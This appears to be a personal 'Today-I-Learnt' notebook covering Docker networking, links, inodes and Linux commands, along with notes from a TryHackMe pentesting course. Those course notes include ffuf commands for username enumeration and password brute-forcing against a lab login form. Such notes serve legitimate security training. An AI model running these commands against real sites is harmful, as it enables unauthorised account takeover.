# Today-I-Learnt

## TIL 05/06/2022

### Docker Network

* You can connect docker containers and services with each other as well as to non-docker workloads

* Docker is a software to build and run containers(_Containers are lightweight packages of your application code together with dependencies such as specific versions of programming language runtimes and libraries required to run your software services._) whereas Kuberentes is an orchestration tool i.e it is used to operate multiple containers at a large scale .

* Docker manipulates iptable rules for networking

* Docker also provides a system for scaling called __Docker Swarm__

* Docker network drivers (bridge, host, overlay, ipvlan, macvlan, none). You can also use third party plugins

* User-defined bridge networks are best when you need multiple containers to communicate on the same Docker host. [Default network](https://docs.docker.com/network/network-tutorial-standalone/)

* [Host networks](https://docs.docker.com/network/network-tutorial-host/) are best when the network stack should not be isolated from the Docker host, but you want other aspects of the container to be isolated.

* [Overlay networks](https://docs.docker.com/network/network-tutorial-overlay/) are best when you need containers running on different Docker hosts to communicate, or when multiple applications work together using swarm services.

* [Macvlan networks](https://docs.docker.com/network/network-tutorial-macvlan/) are best when you are migrating from a VM setup or need your containers to look like physical hosts on your network, each with a unique MAC address.

* Third-party network plugins allow you to integrate Docker with specialized network stacks.

### [Docker and Iptables](https://docs.docker.com/network/iptables/)


### Linux Monitoring


### Tryhackme
#### Course 1. Jnr Pentester 
##### Chapter 1. Authentication Bypass
```bash
# Fuzzing a username
# Which ever field needs to be fuzzed should have a value set as 'FUZZ' 
# '-mr' is the flag used to slect what is the valid output we are looking for in the page
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" 

# Fuzzing password
# When we pass the file as values to the field we use '-w'
# -fc flag is used for status code we are looking for
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.228.119/customers/login -fc 200

```

## TIL 06/06/2022
### Tryhackme
#### Course 1. Jnr Pentester 
##### Chapter 2. Burp suite 
1. Burp suite Repeater
2. Burp suite Intruder
3. Burp suite extender

## TIL 07/06/2022



## TIL 08/06/2022


## TIL 09/06/2022
### Difference betweek Hardlink and Softlink

__Hard Link__ 
1. will act as a copy i.e it will have content of the original file and will not get deleted if the original gets deleted
2. Same Inode number. 
3. Only a super user can create a hardlink for directory
4. A Hard link links files and directories inside the same file system
5. Compareively faster

__Soft Link__ _(Symbolic Link)_ 
1. is just a pointer or reference to the original file 
2. Name-based reference to file


## TIL 12/06/2022
### How to get list of available tools/coomands related to something in linux
```bash
apropos
```
For an example if you want to know about all the available commands/tools in the OS related to disk you can use the below step
```bash
apropos disk

# Output 
DiskUnmountWatcher(8)    - watches for disk unmount and remove cached credentials
FDERecoveryAgent(8)      - Full Disk Encryption Key Recovery Transmission Agent
NRDUpdated(8)            - The Network Recovery on Disk Update daemon
UnmountAssistantAgent(8) - Provides help when a disk can't be ejected
asr(8)                   - Apple Software Restore; copy volumes (e.g. from disk images)
attach_automation_image(8), -(8) - ."====================== attach_automation_image attach and initialize disk images for automation_trampoline(8) ." ."
bitesize.d(1m)           - analyse disk I/O size by process. Uses DTrace
bless(8)                 - set volume bootability and startup disk options
df(1)                    - display free disk space
diskarbitrationd(8)      - disk arbitration daemon
diskimagesiod(8)         - Handles I/O for disk images
disklabel(8)             - manipulate and query an Apple Label disk label
diskmanagementd(8)       - DiskManagement.framework server
diskmanagementstartup(8) - DiskManagement.framework helper tool
disktool(8)              - disk support tool
diskutil(8)              - modify, verify and repair local disks
dmc(1)                   - controls the Disk Mount Conditioner
du(1)                    - display disk usage statistics
fdisk(8)                 - DOS partition maintenance program
hdid(8)                  - historical mechanism for attaching disk images
hdiejectd(8)             - disk image management daemon
hdik(8)                  - lightweight tool to attach and mount disk images in-kernel
hdiutil(1)               - manipulate disk images (attach, verify, create, etc)
hotspot.d(1m)            - print disk event by location. Uses DTrace
htcacheclean(8)          - Clean up the disk cache
iopattern(1m)            - print disk I/O pattern. Uses DTrace
iopending(1m)            - plot number of pending disk events. Uses DTrace
iotop(1m)                - display top disk I/O events by process. Uses DTrace
netbootdisk(8)           - find local drive to use with NetBoot
pdisk(8)                 - Apple partition table editor
pkgbuild(1)              - Build a macOS Installer component package from on-disk files
purge(8)                 - force disk cache to be purged (flushed and emptied)
quota(1)                 - display disk usage and limits
seeksize.d(1m)           - print disk event seek report. Uses DTrace
snmpdf(1)                - display disk space usage on a network entity via SNMP
sync(8)                  - force completion of pending disk writes (flush cache)
Apache2::Reload(3pm)     - Reload Perl Modules when Changed on Disk
:
```
### Inodes 
#### Resources
1. https://docs.rackspace.com/support/how-to/what-are-inodes-in-linux/#:~:text=What%20is%20an%20inode%3F,blocks%20of%20each%20file's%20data.
2. https://syedali.net/2015/02/08/understanding-inodes/
3. https://www.javatpoint.com/linux-inodes

* Linux® must allocate an index node (inode) for every file and directory in the filesystem. Inodes do not store actual data. Instead, they store the metadata where you can find the storage blocks of each file’s data.
* The following metadata exists in an inode:
1. File type
2. Permissions
3. Owner ID
4. Group ID
5. Size of file
6. Time last accessed
7. Time last modified
8. Soft/Hard Links
9. Access Control List (ACLs)

## TIL 21/06/2022
### OAuth 2.0 Vulnerabilities
Resources = [PortSwigger Blogs](https://portswigger.net/web-security/oauth#unverified-user-registration)


### John jumbo installation
```bash
brew install john-jumbo
```
Get access to all the tools under the john suit
```bash

export export PATH="/opt/homebrew/Cellar/john-jumbo/1.9.0/share/john:$PATH"
nano ~/.zprofile # Append the above command in the file
source ~/.zprofile
```



